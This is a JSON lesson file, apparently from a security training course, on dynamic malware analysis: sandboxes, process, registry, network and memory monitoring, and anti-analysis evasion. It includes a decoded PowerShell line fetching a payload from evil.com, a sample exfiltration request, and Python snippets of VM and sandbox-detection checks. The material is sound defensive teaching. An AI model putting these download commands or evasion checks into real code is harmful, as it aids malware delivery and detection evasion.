{
  "lesson_id": "8f7e6d5c-4b3a-2d1e-0f9a-8b7c6d5e4f3a",
  "domain": "malware",
  "title": "Dynamic Malware Analysis",
  "subtitle": "Analyzing malware behavior through controlled execution",
  "difficulty": 2,
  "estimated_time": 40,
  "order_index": 3,
  "prerequisites": [
    "5e3b9c1d-7f2a-4e8b-9d0c-1a2b3c4d5e6f"
  ],
  "concepts": [
    "Sandbox analysis",
    "Behavioral monitoring",
    "Network traffic capture",
    "Registry monitoring",
    "Process monitoring",
    "Memory analysis"
  ],
  "learning_objectives": [
    "Master dynamic analysis techniques in isolated sandbox environments",
    "Learn to monitor malware behavior across system, network, and memory",
    "Understand how to safely detonate malware and capture artifacts",
    "Extract actionable IOCs from runtime behavior"
  ],
  "content_blocks": [
    {
      "block_id": "4c922638-75fe-4369-acbd-fe352cf23aeb",
      "type": "mindset_coach",
      "title": "Watching Malware in Action",
      "content": {
        "text": "**Static analysis told you WHAT the malware contains. Dynamic analysis shows you WHAT IT DOES.**\n\nImagine you found a suspicious PowerShell script. Static analysis shows encoded Base64 strings. But what happens when it runs? Does it:\n- Download additional malware?\n- Steal credentials?\n- Encrypt files?\n- Exfiltrate data?\n\n**You can't know without running it.**\n\n**But running malware is dangerous, right?** YES! That's why we use sandboxes - isolated environments where malware can detonate safely while we watch every move.\n\n**Dynamic analysis reveals**:\n- Network connections (C2 servers)\n- Files created/modified/deleted\n- Registry changes (persistence)\n- Processes spawned\n- API calls made\n- Memory artifacts\n\n**Real example**: In 2020, SolarWinds malware sat dormant in networks for MONTHS. Static analysis of the Orion update showed nothing obvious. Dynamic analysis in a proper environment revealed the backdoor communicating with C2 servers after a 12-14 day dormancy period.\n\n**Dynamic analysis caught what static analysis missed.**\n\n**Your goal**: Learn to safely execute malware, monitor every action, and extract IOCs that protect networks worldwide."
      }
    },
    {
      "block_id": "54bd5879-f8e3-44e3-b08a-10c15b8ec96c",
      "type": "explanation",
      "title": "What is Dynamic Malware Analysis?",
      "content": {
        "text": "**Dynamic Analysis** = Running malware in a controlled environment and observing its behavior\n\n## Static vs Dynamic\n\n**Static**: Reading the blueprint\n**Dynamic**: Watching the building being constructed\n\n```\nStatic Analysis:\n- Safe (no execution)\n- Fast\n- Defeated by packing/obfuscation\n- Shows potential capabilities\n- Can't see runtime behavior\n\nDynamic Analysis:\n- Dangerous (requires isolation)\n- Slower\n- Works on packed malware\n- Shows actual behavior\n- Reveals true intentions\n```bash\n\n## The Sandbox Environment\n\n**Sandbox** = Isolated environment for malware detonation\n\n**Requirements**:\n1. **Isolated network** (no access to production)\n2. **Monitoring tools** (process, network, file, registry)\n3. **Snapshot capability** (restore to clean state)\n4. **Representative OS** (Windows 10, not Windows XP)\n5. **Typical software** (Office, Adobe, browsers)\n\n**Sandbox types**:\n\n**Virtual Machine**:\n- VMware, VirtualBox, Hyper-V\n- Full OS isolation\n- Can snapshot and restore\n- Malware can detect VM\n\n**Automated Sandboxes**:\n- **Cuckoo Sandbox** (open-source)\n- **Any.Run** (commercial, web-based)\n- **Joe Sandbox** (commercial)\n- **Hybrid Analysis** (free limited use)\n\n**Bare Metal**:\n- Physical isolated machine\n- Hardest for malware to detect\n- Most realistic behavior\n- Slower to reset\n\n## Dynamic Analysis Workflow\n\n```\n[Prepare Sandbox]\n↓\n[Take Clean Snapshot]\n↓\n[Start Monitoring Tools]\n↓\n[Execute Malware]\n↓\n[Monitor Behavior] (5-15 minutes)\n↓\n[Capture Artifacts]\n- Process monitor logs\n- Network captures (PCAP)\n- Registry changes\n- File system changes\n- Memory dumps\n↓\n[Restore to Snapshot]\n↓\n[Analyze Captured Data]\n```bash\n\n## Key Monitoring Areas\n\n**1. Process Activity**\n- Processes created\n- Command lines\n- Parent-child relationships\n- Process injection\n\n**2. File System**\n- Files created/modified/deleted\n- Locations (TEMP, AppData, System32)\n- Dropped executables\n\n**3. Registry**\n- Keys created/modified\n- Persistence mechanisms\n- Configuration storage\n\n**4. Network**\n- DNS queries\n- HTTP/HTTPS connections\n- C2 communications\n- Data exfiltration\n\n**5. Memory**\n- Injected code\n- Unpacked payloads\n- Credentials in memory\n- API hooks"
      }
    },
    {
      "block_id": "cfa87907-cdb6-44aa-bb04-b899ac50db6f",
      "type": "explanation",
      "title": "Setting Up Your Analysis Sandbox",
      "content": {
        "text": "## Building a Safe Analysis Environment\n\n### Option 1: VirtualBox + Windows VM\n\n**Step 1: Install VirtualBox**\n```bash\n# Linux\nsudo apt-get install virtualbox\n\n# Windows/Mac: Download from virtualbox.org\n```\n\n**Step 2: Create Windows 10 VM**\n- Download Windows 10 ISO (Microsoft provides evaluation versions)\n- Create VM: 4GB RAM, 50GB disk, 2 CPUs\n- Install Windows 10\n- **DO NOT activate Windows** (evaluation is fine)\n\n**Step 3: Install Monitoring Tools**\n\n**Process Monitor** (Sysinternals):\n```\n1. Download: https://live.sysinternals.com/procmon.exe\n2. Run as Administrator\n3. Set filters (exclude noise)\n```\n\n**Wireshark** (network capture):\n```\n1. Download: https://www.wireshark.org/\n2. Install with Npcap\n3. Capture on active interface\n```\n\n**Regshot** (registry comparison):\n```\n1. Download: https://sourceforge.net/projects/regshot/\n2. Take \"1st shot\" before execution\n3. Take \"2nd shot\" after execution\n4. Compare to see changes\n```\n\n**FakeNet-NG** (network simulation):\n```\n1. Download: https://github.com/mandiant/flare-fakenet-ng\n2. Simulates internet for malware\n3. Captures network requests\n4. Returns fake responses\n```\n\n**Process Hacker** (process viewer):\n```\n1. Download: https://processhacker.sourceforge.io/\n2. More detailed than Task Manager\n3. Shows handles, threads, network connections\n```\n\n**Step 4: Network Isolation**\n\n**Host-only network** (VM can't reach internet):\n```\nVirtualBox → Settings → Network → Adapter 1\nAttached to: Host-only Adapter\nName: vboxnet0\n```\n\n**OR use FakeNet-NG** (simulates internet):\n- Malware thinks it has internet\n- All requests captured\n- No real C2 communication\n\n**Step 5: Create Clean Snapshot**\n```\nVirtualBox → Machine → Take Snapshot\nName: \"Clean Windows 10 + Monitoring Tools\"\n```\n\n**Now you can always restore to clean state!**\n\n### Option 2: Cuckoo Sandbox (Automated)\n\n**Cuckoo** = Open-source automated malware analysis system\n\n**Installation** (Ubuntu):\n```bash\n# Install dependencies\nsudo apt-get install python3 python3-pip python-dev libffi-dev libssl-dev\nsudo apt-get install mongodb postgresql libpq-dev\n\n# Install Cuckoo\npip3 install cuckoo\n\n# Initialize\ncuckoo init\ncuckoo community\n\n# Configure VMs\ncuckoo machine --add windows10_vm\n\n# Start Cuckoo\ncuckoo -d\n\n# Web interface\ncuckoo web runserver 0.0.0.0:8000\n```\n\n**Submit malware**:\n```bash\ncuckoo submit malware.exe\n```\n\n**Cuckoo provides**:\n- Automated execution\n- Screenshots every N seconds\n- Full behavior report\n- Network captures\n- Dropped files extraction\n- YARA matching\n\n### Option 3: Cloud Sandboxes\n\n**Any.Run** (https://any.run/):\n- Interactive sandbox\n- Windows and Linux VMs\n- Watch malware execution in real-time\n- Free public submissions\n- Paid for private analysis\n\n**Hybrid Analysis** (https://hybrid-analysis.com/):\n- Free automated analysis\n- Multiple OS environments\n- Community intelligence\n- API access\n\n**Joe Sandbox** (https://www.joesandbox.com/):\n- Advanced behavior analysis\n- Cloud and on-premise\n- Extensive reporting\n\n**WARNING**: Public sandboxes share samples with community. Don't upload proprietary/confidential malware!"
      }
    },
    {
      "block_id": "e9f066aa-3cb0-4509-859d-bd6268170aac",
      "type": "explanation",
      "title": "Monitoring Process Activity",
      "content": {
        "text": "**Process Monitor (Procmon)** = Essential tool for Windows dynamic analysis\n\n## Using Process Monitor\n\n**Step 1: Configure Filters**\n\nProcmon captures EVERYTHING (thousands of events/second). Filter out noise:\n\n**Filter by Process**:\n```\nProcess Name | is | malware.exe | Include\nProcess Name | is | powershell.exe | Include\nProcess Name | is | cmd.exe | Include\n```\n\n**Filter by Operation**:\n```\nOperation | is | Process Create | Include\nOperation | is | RegSetValue | Include\nOperation | is | CreateFile | Include\n```\n\n**Exclude noise**:\n```\nProcess Name | is | svchost.exe | Exclude\nProcess Name | is | System | Exclude\n```\n\n**Step 2: Capture Execution**\n\n```\n1. Start Procmon\n2. Apply filters\n3. Clear existing events (Ctrl+X)\n4. Execute malware\n5. Let run for 5-10 minutes\n6. Stop capture\n7. Save log: File → Save → PML format\n```\n\n**Step 3: Analyze Key Events**\n\n### Process Creation\n\n**Look for**:\n- `Process Create` events\n- Command lines\n- Parent-child relationships\n\n**Example: Emotet**:\n```\nTime: 10:32:15\nOperation: Process Create\nPath: C:\\Windows\\System32\\cmd.exe\nCommand Line: cmd.exe /c powershell.exe -enc WwBTAHkA...\nParent PID: 1234 (malware.exe)\nChild PID: 5678 (cmd.exe)\n```\n\n**Analysis**: Malware spawned cmd.exe which launched PowerShell with Base64-encoded command\n\n### File Operations\n\n**Look for**:\n- `CreateFile` events\n- Suspicious locations\n- Dropped executables\n\n**Example**:\n```\nOperation: CreateFile\nPath: C:\\Users\\Admin\\AppData\\Local\\Temp\\update.exe\nResult: SUCCESS\n```\n\n**Action**: Extract dropped file for further analysis\n\n### Registry Modifications\n\n**Look for**:\n- `RegSetValue` events\n- Persistence keys\n- Configuration storage\n\n**Example: Persistence**:\n```\nOperation: RegSetValue\nPath: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdate\nValue: C:\\Users\\Admin\\AppData\\Local\\Temp\\malware.exe\nResult: SUCCESS\n```\n\n**Analysis**: Malware set autorun key for persistence\n\n### Network Activity\n\n**Look for**:\n- `TCP Connect` events\n- `TCP Send/Receive` events\n- Destination IPs/ports\n\n**Example**:\n```\nOperation: TCP Connect\nDestination: 192.168.50.100:443\nResult: SUCCESS\n```\n\n**Action**: Block this IP, investigate connections\n\n## Process Relationships\n\n**Process tree visualization**:\n\n```\nmalware.exe (PID 1000)\n└─> cmd.exe (PID 2000)\n└─> powershell.exe (PID 3000)\n└─> update.exe (PID 4000)\n└─> [Network connection to C2]\n```\n\n**This shows execution chain**: Original malware → cmd → PowerShell → dropped payload → C2 connection\n\n## Process Injection Detection\n\n**Process injection** = Malware injecting code into legitimate process\n\n**Indicators**:\n```\nOperation: WriteProcessMemory\nProcess: malware.exe\nTarget Process: explorer.exe\nLength: 8192 bytes\n```\n\n**Analysis**: Malware writing to explorer.exe memory (likely code injection)\n\n**Confirmation**: Check if explorer.exe makes unexpected network connections"
      }
    },
    {
      "block_id": "7a8a230d-ec47-4869-a4b4-b0321732f2b6",
      "type": "explanation",
      "title": "Network Traffic Analysis",
      "content": {
        "text": "**Network capture reveals C2 communications, data exfiltration, and malware downloads**\n\n## Capturing Network Traffic\n\n**Wireshark**:\n\n```\n1. Start Wireshark\n2. Select interface (Ethernet or WiFi)\n3. Start capture\n4. Execute malware\n5. Let capture run 10+ minutes\n6. Stop capture\n7. Save: File → Save As → PCAP format\n```\n\n**Display filters** (focus on malware traffic):\n\n```bash\n# HTTP traffic\nhttp\n\n# HTTPS traffic (encrypted)\ntls\n\n# DNS queries\ndns\n\n# Traffic to/from specific IP\nip.addr == 192.168.50.100\n\n# Non-standard ports\ntcp.port != 80 && tcp.port != 443\n\n# POST requests (data exfiltration)\nhttp.request.method == \"POST\"\n```bash\n\n## Analyzing DNS Queries\n\n**DNS queries reveal domains contacted**\n\n**Filter**: `dns`\n\n**Example output**:\n```\nQuery: malicious-c2.com → A record\nResponse: 192.168.50.100\n\nQuery: update-service.net → A record\nResponse: 203.0.113.42\n```\n\n**IOCs extracted**: \n- `malicious-c2.com`\n- `update-service.net`\n- `192.168.50.100`\n- `203.0.113.42`\n\n**Action**: Block domains and IPs\n\n## Analyzing HTTP Traffic\n\n**Filter**: `http`\n\n**Look for**:\n\n**Beaconing** (periodic check-ins):\n```\nGET /api/check HTTP/1.1\nHost: c2-server.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\n\nHTTP/1.1 200 OK\nContent-Length: 4\n\nOKAY\n```\n\n**Command retrieval**:\n```\nGET /commands HTTP/1.1\nHost: c2-server.com\n\nHTTP/1.1 200 OK\nContent-Length: 50\n\n{\"cmd\":\"download\",\"url\":\"http://evil.com/tool.exe\"}\n```\n\n**Data exfiltration**:\n```\nPOST /upload HTTP/1.1\nHost: c2-server.com\nContent-Type: application/octet-stream\nContent-Length: 52428800\n\n[Binary data - 50MB file]\n```\n\n**Analysis**: Malware uploaded 50MB of data (likely stolen files)\n\n## Extracting Files from PCAP\n\n**Wireshark file extraction**:\n\n```\n1. File → Export Objects → HTTP\n2. View all HTTP transfers\n3. Select interesting files\n4. Save to disk\n5. Analyze extracted files\n```\n\n**Example**: Malware downloaded `update.exe` via HTTP. Extract it and analyze statically/dynamically.\n\n## TLS/HTTPS Analysis\n\n**Challenge**: Encrypted traffic (can't see content)\n\n**What you CAN see**:\n- Destination IP/domain (SNI field)\n- Certificate information\n- Connection timing/frequency\n- Data volume\n\n**Filter**: `tls.handshake.extensions_server_name`\n\n**Example**:\n```\nSNI: malicious-domain.com\nCertificate Issuer: Let's Encrypt\nCertificate Subject: malicious-domain.com\n```\n\n**IOC**: `malicious-domain.com` (even though content is encrypted)\n\n## Non-Standard Ports\n\n**Malware often uses uncommon ports**\n\n**Filter**: `tcp.port != 80 && tcp.port != 443 && tcp.port != 53`\n\n**Example**:\n```\nConnection: 192.168.1.100:4444 → 203.0.113.50:8443\nProtocol: Unknown (not HTTP/HTTPS)\nData: Binary encrypted stream\n```\n\n**Analysis**: Custom protocol on port 8443 (likely C2)\n\n## Beaconing Detection\n\n**Beacon** = Periodic check-in to C2\n\n**Characteristics**:\n- Regular intervals (every 60 seconds, every 5 minutes)\n- Small requests\n- Consistent destination\n\n**Wireshark Statistics**:\n```\nStatistics → Conversations → TCP\nSort by packets/bytes\nLook for regular patterns\n```\n\n**Example**:\n```\nDestination: 192.168.50.100:443\nPackets: 120\nBytes: 24,000\nDuration: 1 hour\n\n^ 120 packets / 60 minutes = 2 packets/minute (beacon every 30 seconds)\n```bash\n\n## FakeNet-NG for Offline Analysis\n\n**Problem**: Malware won't run without internet\n\n**Solution**: FakeNet-NG simulates internet\n\n**Usage**:\n```cmd\ncd C:\\Tools\\fakenet-ng\npython fakenet.py\n```\n\n**What it does**:\n- Responds to all DNS queries\n- Simulates HTTP/HTTPS servers\n- Logs all requests\n- Returns fake data\n\n**Benefit**: Malware \"thinks\" it has internet, executes normally, but all traffic is captured locally"
      }
    },
    {
      "block_id": "479b86a1-bcc7-4cd1-a667-e1a0acc2ff35",
      "type": "explanation",
      "title": "Registry and File System Monitoring",
      "content": {
        "text": "## Registry Monitoring with Regshot\n\n**Regshot** = Takes registry snapshots and compares them\n\n**Workflow**:\n\n```\n1. Open Regshot\n2. Click \"1st shot\" → \"Shot\"\n3. Wait for completion\n4. Execute malware\n5. Let malware run 5-10 minutes\n6. Click \"2nd shot\" → \"Shot\"\n7. Click \"Compare\"\n8. Review changes\n```\n\n**Example output**:\n\n```\n----------------------------------\nKeys added: 3\n----------------------------------\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate\nHKCU\\Software\\MalwareConfig\nHKLM\\SOFTWARE\\Classes\\CLSID\\{malicious-guid}\n\n----------------------------------\nValues added: 5\n----------------------------------\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate: \"C:\\Users\\Admin\\AppData\\Local\\malware.exe\"\nHKCU\\Software\\MalwareConfig\\C2Server: \"192.168.50.100\"\nHKCU\\Software\\MalwareConfig\\Port: 8443\nHKCU\\Software\\MalwareConfig\\Interval: 60\nHKCU\\Software\\MalwareConfig\\InstallDate: \"2024-01-20\"\n```\n\n**Analysis**:\n✅ **Persistence**: Run key for autostart\n✅ **Configuration**: C2 server, port, beacon interval stored in registry\n✅ **IOCs**: C2 server `192.168.50.100:8443`, beacon every 60 seconds\n\n**Common persistence locations**:\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\nHKLM\\SYSTEM\\CurrentControlSet\\Services (new service)\n```bash\n\n## File System Monitoring\n\n**Files created** (common locations):\n\n```\nC:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\  (temporary files)\nC:\\Users\\%USERNAME%\\AppData\\Roaming\\     (persistent storage)\nC:\\ProgramData\\                          (shared data)\nC:\\Windows\\System32\\                     (system files - VERY suspicious)\nC:\\Users\\%USERNAME%\\Downloads\\           (initial dropper location)\n```\n\n**Dropped files example** (from Procmon):\n\n```\nFile: C:\\Users\\Admin\\AppData\\Local\\Temp\\update.exe\nSize: 2,450,000 bytes\nMD5: 5d41402abc4b2a76b9719d911017c592\nCreated by: malware.exe (PID 1234)\n\nFile: C:\\Users\\Admin\\AppData\\Roaming\\config.dat\nSize: 512 bytes\nContent: C2 configuration (encrypted)\nCreated by: malware.exe (PID 1234)\n```\n\n**Action**: Extract dropped files for analysis\n\n## Extracting Dropped Files\n\n**Manual extraction**:\n```\n1. Pause malware execution\n2. Copy files from VM to host\n3. Calculate hashes\n4. Analyze dropped files\n```\n\n**Automated (Cuckoo)**:\n```\nCuckoo automatically extracts all dropped files\nLocation: cuckoo/storage/analyses/[task_id]/files/\n```"
      }
    },
    {
      "block_id": "75da3e70-9f65-4dd0-92f9-9a404fa7f9d1",
      "type": "explanation",
      "title": "Memory Forensics and Analysis",
      "content": {
        "text": "**Memory analysis reveals unpacked malware, injected code, and artifacts invisible on disk**\n\n## Capturing Memory\n\n**Volatility** = Leading memory forensics framework\n\n**Dumping memory**:\n\n**Method 1: DumpIt** (Windows):\n```\n1. Download DumpIt.exe\n2. Run as Administrator\n3. Creates memory.dmp in same directory\n```\n\n**Method 2: FTK Imager**:\n```\n1. File → Capture Memory\n2. Select destination\n3. Captures RAM to file\n```\n\n**Method 3: VM snapshot** (VMware/VirtualBox):\n```\n1. Suspend VM\n2. Extract .vmem file (VMware) or memory dump (VirtualBox)\n3. This is raw memory\n```bash\n\n## Volatility Analysis\n\n**Installation**:\n```bash\npip3 install volatility3\n```\n\n**Basic commands**:\n\n### 1. List Processes\n```bash\nvol -f memory.dmp windows.pslist\n```\n\n**Output**:\n```\nPID   PPID  Name              \n1000  800   malware.exe       \n2000  1000  cmd.exe          \n3000  2000  powershell.exe    \n4000  3000  update.exe        \n```\n\n**Analysis**: Process tree shows malware spawning cmd → PowerShell → dropped payload\n\n### 2. Network Connections\n```bash\nvol -f memory.dmp windows.netscan\n```\n\n**Output**:\n```\nProto  Local Address          Foreign Address        State    PID   Owner\nTCPv4  192.168.1.100:49152    192.168.50.100:443    ESTABLISHED 1000  malware.exe\nTCPv4  192.168.1.100:49153    203.0.113.42:8080     ESTABLISHED 4000  update.exe\n```\n\n**IOCs**: Two C2 servers identified (`192.168.50.100:443`, `203.0.113.42:8080`)\n\n### 3. DLL Analysis\n```bash\nvol -f memory.dmp windows.dlllist --pid 1000\n```\n\n**Look for**:\n- Suspicious DLLs\n- DLLs loaded from TEMP\n- Unsigned DLLs\n\n### 4. Command Line Arguments\n```bash\nvol -f memory.dmp windows.cmdline\n```\n\n**Output**:\n```\nmalware.exe: C:\\Users\\Admin\\Downloads\\invoice.exe\ncmd.exe: cmd.exe /c powershell.exe -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4A...\npowershell.exe: powershell.exe -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4A...\n```\n\n**Decode Base64**:\n```bash\necho \"WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4A...\" | base64 -d\n# Output: [System.Net.WebClient].DownloadFile('http://evil.com/payload.exe','C:\\temp\\payload.exe')\n```\n\n**Analysis**: PowerShell downloads additional payload from `http://evil.com/payload.exe`\n\n### 5. Dump Suspicious Process\n```bash\nvol -f memory.dmp windows.memmap --pid 1000 --dump\n```\n\n**Creates**: `pid.1000.dmp` file\n\n**Analyze dumped process**:\n```bash\nstrings pid.1000.dmp | grep -i \"http\"\n# Extract URLs, IPs, domains from memory\n```bash\n\n## Finding Injected Code\n\n**Malfind plugin** (detects code injection):\n\n```bash\nvol -f memory.dmp windows.malfind\n```\n\n**Output**:\n```\nProcess: explorer.exe (PID 1500)\nAddress: 0x7FFE0000\nProtection: PAGE_EXECUTE_READWRITE\nFlags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1\n\nHexdump:\n4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............\n\nDisassembly:\npush ebp\nmov ebp, esp\npush esi\ncall 0x7ffe0050\n```\n\n**Analysis**: \n- `explorer.exe` has executable memory that's not backed by a file\n- Starts with `MZ` (PE header) → Likely injected DLL\n- Code injection detected!\n\n## Memory Strings Analysis\n\n```bash\nstrings memory.dmp > memory_strings.txt\ngrep -i \"password\" memory_strings.txt\ngrep -E \"https?://\" memory_strings.txt\ngrep -oE \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" memory_strings.txt\n```\n\n**Can find**:\n- Cleartext passwords\n- C2 URLs\n- Decryption keys\n- Configuration data"
      }
    },
    {
      "block_id": "1a554518-11a5-4fb3-a15c-0fb579a68f30",
      "type": "explanation",
      "title": "Anti-Analysis and Evasion Techniques",
      "content": {
        "text": "**Sophisticated malware detects analysis environments and changes behavior**\n\n## Common Evasion Techniques\n\n### 1. VM Detection\n\n**Checks for**:\n- VMware/VirtualBox artifacts\n- Virtual hardware\n- VM-specific registry keys\n- VM processes\n\n**Detection methods**:\n```python\n# Check for VMware\nif \"VMware\" in os.popen(\"wmic computersystem get manufacturer\").read():\nexit()  # Don't execute in VM\n\n# Check for VirtualBox\nif os.path.exists(\"C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions\\\\\"):\nexit()\n\n# Check CPU count (VMs often have few CPUs)\nif os.cpu_count() < 2:\nexit()\n```\n\n**Countermeasures**:\n- Use multiple CPUs (4+)\n- Remove VM tools\n- Modify VM artifacts\n- Use bare metal for critical analysis\n\n### 2. Sandbox Detection\n\n**Checks for**:\n- Known sandbox IPs/domains\n- Analysis tools running (Procmon, Wireshark)\n- Mouse movement (sandboxes don't have user interaction)\n- Uptime (freshly booted = likely sandbox)\n\n**Example**:\n```python\nimport win32api\nimport time\n\n# Check uptime\nuptime = win32api.GetTickCount() / 1000 / 60\nif uptime < 10:  # Less than 10 minutes\nexit()  # Likely sandbox\n\n# Check for user activity\nlast_input = win32api.GetLastInputInfo()\nif time.time() - last_input > 300:  # No input for 5 minutes\nexit()  # No real user\n```\n\n**Countermeasures**:\n- Let VM run for hours before analysis\n- Simulate user activity (mouse movements, keystrokes)\n- Age the system (create browsing history, files)\n\n### 3. Time-Based Evasion\n\n**Sleep before execution**:\n```python\nimport time\ntime.sleep(3600)  # Sleep 1 hour\n# Then execute malicious payload\n```\n\n**Sandboxes have limited analysis time** (5-15 minutes). If malware sleeps 1 hour, sandbox misses it.\n\n**Countermeasure**: \n- Extend analysis time\n- Hook sleep functions to skip delays\n\n### 4. Trigger-Based Execution\n\n**Only execute on specific conditions**:\n```python\n# Only execute on specific date\nif datetime.now().date() != datetime(2024, 3, 15).date():\nexit()\n\n# Only execute if specific file exists\nif not os.path.exists(\"C:\\\\Users\\\\Admin\\\\Documents\\\\targets.xlsx\"):\nexit()\n\n# Only execute in specific domain\nif \"TARGETCORP\" not in os.environ.get(\"USERDOMAIN\", \"\"):\nexit()\n```\n\n**Analysis**: SolarWinds malware checked for domain membership before executing\n\n**Countermeasure**: \n- Configure sandbox to match target environment\n- Join sandbox to test domain\n- Create expected files/conditions\n\n### 5. Geolocation Checks\n\n**Check external IP location**:\n```python\nimport requests\nr = requests.get(\"http://ipinfo.io/country\")\nif r.text.strip() != \"US\":  # Only execute in US\nexit()\n```\n\n**Countermeasure**: Use VPN or proxy to match target country\n\n## Bypassing Evasion\n\n**General strategies**:\n\n1. **Make sandbox realistic**\n- Real user accounts\n- Browsing history\n- Installed applications\n- Documents in typical locations\n- Aged system (not fresh install)\n\n2. **Hide analysis tools**\n- Run tools from external system\n- Use kernel-mode monitors\n- Network tap instead of inline capture\n\n3. **Extend analysis time**\n- Run for hours/days, not minutes\n- Automate periodic interaction\n\n4. **Patch malware**\n- Remove VM checks\n- Patch sleep calls\n- Force execution path (advanced)\n\n5. **Use multiple analysis methods**\n- Automated sandbox\n- Manual analysis in realistic environment\n- Bare metal analysis for critical samples"
      }
    },
    {
      "block_id": "952783b2-209e-4886-a5f5-6fd258ff9882",
      "type": "memory_aid",
      "title": "Dynamic Analysis Memory Aids",
      "content": {
        "text": "## Dynamic Analysis Workflow\n\n**\"PSMER\"** (Prepare, Snapshot, Monitor, Execute, Restore):\n\n1. **P**repare sandbox\n2. **S**napshot clean state\n3. **M**onitor (start tools)\n4. **E**xecute malware\n5. **R**estore snapshot\n\n## Key Monitoring Areas\n\n**\"PFRN M\"** (Process, File, Registry, Network, Memory):\n\n- **P**rocesses\n- **F**iles\n- **R**egistry\n- **N**etwork\n- **M**emory\n\n## Essential Tools\n\n**\"PWRF\"** (Procmon, Wireshark, Regshot, FakeNet):\n\n- **P**rocmon (process/file/registry)\n- **W**ireshark (network)\n- **R**egshot (registry comparison)\n- **F**akeNet (network simulation)\n\n## IOCs to Extract\n\n**\"DFPRMC\"**:\n\n- **D**omains contacted\n- **F**iles dropped\n- **P**rocesses spawned\n- **R**egistry keys modified\n- **M**utexes created\n- **C**ommand and control IPs\n\n## Evasion Detection\n\n**\"VTSG\"** (VM, Time, Sandbox, Geo):\n\n- **V**M detection\n- **T**ime-based delays\n- **S**andbox checks\n- **G**eolocation filters\n\n## Memory Analysis Commands\n\n**\"PNDC\"** (PSlist, Netscan, DLLlist, Cmdline):\n\n```bash\nvol -f memory.dmp windows.pslist      # Processes\nvol -f memory.dmp windows.netscan     # Network\nvol -f memory.dmp windows.dlllist     # DLLs\nvol -f memory.dmp windows.cmdline     # Commands\n```bash\n\n## Red Flags in Dynamic Analysis\n\n```\n☐ Process spawning cmd.exe → powershell.exe\n☐ Files dropped in TEMP or AppData\n☐ Registry Run keys created\n☐ Connections to non-standard ports\n☐ Base64-encoded commands\n☐ Process injection detected\n☐ Large data uploads (exfiltration)\n☐ Periodic beaconing behavior\n☐ Code injection (malfind)\n☐ Anti-analysis checks executed\n```"
      }
    },
    {
      "block_id": "deec9a2a-6409-4b77-bace-77dfac127fc6",
      "type": "explanation",
      "title": "Key Takeaways and Next Steps",
      "content": {
        "text": "## What You've Learned\n\n✅ **Dynamic analysis reveals actual malware behavior** by executing it in controlled environments\n\n✅ **Sandbox isolation is critical** - network isolation, snapshots, monitoring tools\n\n✅ **Monitor five key areas**: Process, File, Registry, Network, Memory (PFRN M)\n\n✅ **Essential tools**: Procmon, Wireshark, Regshot, FakeNet-NG, Volatility\n\n✅ **Extract actionable IOCs**: C2 IPs/domains, dropped files, persistence mechanisms\n\n✅ **Malware uses evasion** - VM detection, time delays, sandbox checks\n\n✅ **Combine static and dynamic** - Static shows potential, dynamic shows reality\n\n## Practical Next Steps\n\n**1. Build your analysis lab**\n\nMinimum setup:\n```\n- VirtualBox + Windows 10 VM\n- Procmon\n- Wireshark  \n- Regshot\n- FakeNet-NG\n- Volatility\n```\n\nTotal cost: **$0** (all tools are free!)\n\n**2. Practice on safe samples**\n\nDownload from:\n- Malware Bazaar: https://bazaar.abuse.ch/\n- theZoo: https://github.com/ytisf/theZoo\n- Any.Run: https://any.run/ (watch others' analyses)\n\n**CRITICAL**: Only download in isolated VM!\n\n**3. Analyze your first sample**\n\n**Exercise: Analyze Emotet**\n\n```\n1. Take clean snapshot\n2. Start Procmon (filter: malware.exe)\n3. Start Wireshark\n4. Take Regshot \"1st shot\"\n5. Execute malware.exe\n6. Wait 10 minutes\n7. Take Regshot \"2nd shot\"\n8. Stop captures\n9. Compare/analyze\n10. Restore snapshot\n```\n\n**Document**:\n- Processes created\n- Files dropped (with hashes)\n- Registry keys modified\n- Network connections (C2 IPs/domains)\n- Memory artifacts\n- Conclusion (malware family, capabilities)\n\n**4. Use automated sandboxes**\n\n**Try online sandboxes**:\n\n**Hybrid Analysis**:\n```\n1. Go to hybrid-analysis.com\n2. Upload sample\n3. Wait for analysis\n4. Review report\n5. Download IOCs\n```\n\n**Any.Run**:\n```\n1. Go to any.run\n2. Upload sample\n3. Watch execution in real-time\n4. Interact with malware\n5. Extract artifacts\n```\n\n**5. Learn Volatility**\n\n**Practice commands**:\n```bash\n# Download practice memory images\nwget https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples\n\n# Basic analysis\nvol -f memory.dmp windows.info\nvol -f memory.dmp windows.pslist\nvol -f memory.dmp windows.pstree\nvol -f memory.dmp windows.netscan\nvol -f memory.dmp windows.malfind\nvol -f memory.dmp windows.cmdline\n```\n\n**6. Build detection rules**\n\nFrom dynamic analysis, create:\n\n**SIEM rules**:\n```\nIF process=cmd.exe \nAND command_line contains \"powershell.exe -enc\"\nTHEN ALERT \"Suspicious encoded PowerShell\"\n```\n\n**Network signatures**:\n```\nIF dst_ip=192.168.50.100\nAND dst_port=443\nTHEN BLOCK \"Known C2 server\"\n```\n\n**EDR rules**:\n```\nIF process creates registry key \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nAND process not in whitelist\nTHEN ALERT \"Persistence mechanism\"\n```bash\n\n## Real-World Application\n\n**Scenario: SOC alert on suspicious executable**\n\n**Your response**:\n\n```bash\n# 1. Static analysis first (safe)\nsha256sum suspicious.exe\nstrings suspicious.exe | grep -E \"https?://\"\n\n# If static analysis insufficient, move to dynamic\n\n# 2. Prepare sandbox\nVirtualBox → 